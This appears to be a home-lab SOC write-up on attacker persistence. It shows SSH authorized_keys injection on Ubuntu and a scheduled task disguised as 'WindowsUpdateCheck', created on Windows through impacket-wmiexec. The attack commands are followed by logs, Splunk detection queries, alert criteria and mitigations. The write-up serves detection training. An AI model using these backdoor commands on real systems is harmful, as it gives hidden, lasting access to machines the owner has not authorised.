# Attack 08: Persistence (Post-Exploitation Access)

---

## Attack Objective

To establish long-term access on compromised systems by configuring mechanisms that allow the attacker to regain access after logout or reboot, without re-exploitation.

---

## Environment

### Attacker Machine
- Kali Linux
- Tools: OpenSSH, Impacket (wmiexec)
- Splunk Enterprise

### Victim Machines
- Ubuntu 24.04.3 LTS
  - Splunk Universal Forwarder installed
- Windows 10 (Build 19044)
  - Advanced Auditing enabled
  - Splunk Universal Forwarder installed

---

## MITRE ATT&CK Mapping

| Tactic               | Technique ID | Technique Name                                |
|----------------------|--------------|----------------------------------------------|
| Persistence          | T1098        | Account Manipulation (SSH key injection)    |
| Persistence          | T1053.005    | Scheduled Task / Job (Windows)              |
| Lateral Movement     | T1021.004    | Remote Services: SSH                         |

---

## Attack Execution

### Ubuntu – Persistence via SSH Authorized Keys

The attacker generated an RSA key pair locally and appended the public key to the victim user’s `~/.ssh/authorized_keys` file to enable passwordless login. File permissions were hardened to avoid rejection.

#### Commands Executed

    ssh-keygen -t rsa -b 2048 -f kali_persist_key
    cat kali_persist_key.pub | ssh lucifer@10.178.180.79 "cat >> ~/.ssh/authorized_keys"
    chmod 600 ~/.ssh/authorized_keys
    ssh -i kali_persist_key lucifer@10.178.180.79

### Windows – Persistence via Scheduled Task

The attacker authenticated remotely using valid credentials and created a scheduled task via WMI to maintain access. The task was named to resemble a legitimate Windows update process.

#### Commands Executed
    impacket-wmiexec Gowtham:7774@10.178.180.234 \
    "schtasks /create /sc onlogon /tn WindowsUpdateCheck /tr cmd.exe /f"

## Logs Generated
### Ubuntu – Raw Logs
    2025-12-30T17:09:50.404534+05:30 lucifer-VirtualBox sshd[3795]:
    Accepted key RSA SHA256:/bhKYhCChYNBXmba4uaI12Do3kb/Ldgwy50k69VlmMw
    found at /home/lucifer/.ssh/authorized_keys:1

    2025-12-30T17:09:50.433798+05:30 lucifer-VirtualBox sshd[3795]:
    Accepted publickey for lucifer from 10.178.180.19 port 56412 ssh2

    type=USER_LOGIN msg=audit(1767094790.649:364):
    exe="/usr/sbin/sshd" acct="lucifer" addr=10.178.180.19 res=success

### Windows – Raw Logs
    EventCode=4624
    Logon Type: 3
    Account Name: Gowtham
    Authentication Package: NTLM
    Source Network Address: 10.178.180.19
    Elevated Token: Yes

    EventCode=4672
    Message: Special privileges assigned to new logon
    Privileges: SeDebugPrivilege, SeImpersonatePrivilege, SeTakeOwnershipPrivilege

    EventCode=4688
    New Process Name: C:\Windows\System32\schtasks.exe
    Process Command Line: schtasks /query /tn WindowsUpdateCheck
    Creator Process Name: C:\Windows\System32\cmd.exe

## Log Explanation
### Ubuntu

- Log Files: /var/log/auth.log, /var/log/audit/audit.log
- User: lucifer
- Behavior Observed:
  - Accepted RSA key fingerprint
  - Authorized key appended to ~/.ssh/authorized_keys
  - Successful passwordless login from remote host
- Security Impact: Persistent SSH access survives password changes, representing a high-risk stealth backdoor.

### Windows

- Event ID 4624: Network logon confirms remote access
- Event ID 4672: Administrative privileges required for scheduled task creation
- Event ID 4688: Execution of schtasks.exe with a task named WindowsUpdateCheck
- Security Impact: Task executes on logon, enabling persistence after reboot or logoff, mimicking legitimate Windows services.

## Detection Logic (Splunk SPL)
### Ubuntu – SSH Key-Based Persistence
    index=linux_index sourcetype=linux_secure
    | search "Accepted publickey"
    | table _time host user src

### Windows – Scheduled Task Persistence
    index=windows_index EventCode=4688
    | search Process_Command_Line="*schtasks*create*"
    | table _time Account_Name New_Process_Name Process_Command_Line

## Alert Logic (SOC Use Case)
### Trigger Conditions
- First-time SSH key authentication for a user
- Unauthorized changes to ~/.ssh/authorized_keys
- Execution of schtasks.exe creating tasks outside known administrative workflows
- Remote authentication combined with privilege escalation (Event 4672)
### Alert Classification
- Persistence / Post-Exploitation Access
### Escalation Criteria
- Scheduled tasks or SSH keys added to multiple hosts
- Unauthorized or disguised task names (e.g., mimicking Windows updates)
- Recurrent remote logins using new keys

## Severity Assessment

| Metric               | Value             |
| -------------------- | ----------------- |
| Severity             | High              |
| Attack Complexity    | Medium            |
| Impact Potential     | High              |
| Privilege Required   | Valid credentials |
| Detection Confidence | High              |

## Analysis

- Demonstrates post-exploitation persistence via native OS mechanisms
- Linux: SSH key backdoor for stealthy passwordless access
- Windows: Scheduled task to regain access after logon/reboot
- Both survive system restarts and avoid detection by mimicking legitimate operations
- MITRE ATT&CK Techniques:
  - T1098 – Account Manipulation
  - T1053.005 – Scheduled Task / Job
  - T1021.004 – Remote Services (SSH)

## SOC Conclusion

Attack 08 successfully established persistence on both Ubuntu and Windows systems.
Telemetry captured key indicators: authentication method changes, administrative privilege use, and persistence artifact creation.
This enables forensic reconstruction and immediate SOC response.

## Mitigation & Response

- Monitor changes to ~/.ssh/authorized_keys and alert on additions
- Restrict scheduled task creation to trusted administrators only
- Implement centralized configuration and integrity monitoring
- Alert on execution of schtasks.exe creating non-standard tasks
- Enforce MFA for administrative and SSH access
- Perform periodic review of persistent accounts and scheduled tasks
